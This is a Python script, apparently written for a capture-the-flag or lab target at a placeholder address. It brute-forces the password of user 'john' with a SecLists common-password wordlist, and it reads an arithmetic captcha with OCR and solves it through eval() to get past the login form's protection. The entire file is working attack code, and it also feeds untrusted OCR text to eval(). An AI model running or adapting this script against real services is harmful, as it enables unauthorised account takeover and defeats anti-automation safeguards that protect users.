import requests
from PIL import Image
import pytesseract
import re

def main():
	with open("/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt", "r") as passwords:
		with requests.Session() as session:
			for word in passwords:
				#print(word)
				get_img = session.get('http://{IP}:16095/captcha.php')
				with open("captcha.png", "wb") as file:
					for chunk in get_img.iter_content(chunk_size=8192):
						file.write(chunk)
			
				with Image.open("captcha.png") as img:
					#cconfig = r"--psm 7 -c tessedit_char_whitelist=0123456789+-*/="
					cconfig = r"--psm 7"
					raw_text = pytesseract.image_to_string(img, config=cconfig).strip()		
			
					clean = re.sub(r"[^0-9+-*/]", "", raw_text) #
					solve = eval(clean)
					#print(solve)
			
				r = session.post('http://{IP}:16095/auth.php', data={'username': 'john','password':str(word).strip(),'captcha':str(solve).strip()})
				if "captcha" in r.text:
					print("Password:",str(word),"|","Captcha:",str(clean),"|","Answer:",eval(clean),"|", "login? ","no")
					#print("Captcha:",clean,"Solve:",solve)
					#print(r.text)
					#print(r.request.body)
				else:
					print("==========================================")
					print("Password:",str(word),"|","Captcha:",str(clean),"|","Answer:",eval(clean),"|", "login? ","YES")
					print(r.request.body)
					print("==========================================")
					break
			

if __name__ == "__main__":
	main()
